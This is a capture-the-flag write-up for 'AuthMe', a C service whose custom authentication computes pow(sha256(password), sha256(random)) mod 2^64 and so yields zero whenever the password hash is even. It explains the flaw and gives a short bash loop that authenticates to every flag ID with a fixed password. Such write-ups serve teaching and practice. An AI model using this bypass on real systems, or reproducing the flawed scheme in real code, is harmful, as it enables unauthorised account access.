# AuthMe

## Description

The service implements a custom authentication protocol. To authenticate, the client
and the server establish a common random value, the first two bytes of the random
are sent by the server, and some bytes are sent by the client. Concatenated, they form
a common secret.

To authenticate the client sends the value of
pow(sha256(password), sha256(random)) by modulo pow(2, 64). The server compares
the expected value with obtained value and if they are equal the user is authenticated.

The service is written in C language and has client and server parts.

## The vuln

The authentication algorithm is insecure because if sha256(password) is even, the
pow result is zero. So half of the flags could be stolen just by asking the client to
authenticate a user with a random password. Sounds simple, but it took more then
2 hours for the first team to exploit the service. This vuln was unintended.


# Exploitation

The exploit is trivial

```
#!/bin/bash

hostname=${1:?Usage: ./spl.sh hostname}

for flagid in $(./client $hostname list); do
    ./client $hostname auth $flagid 1234
done
```
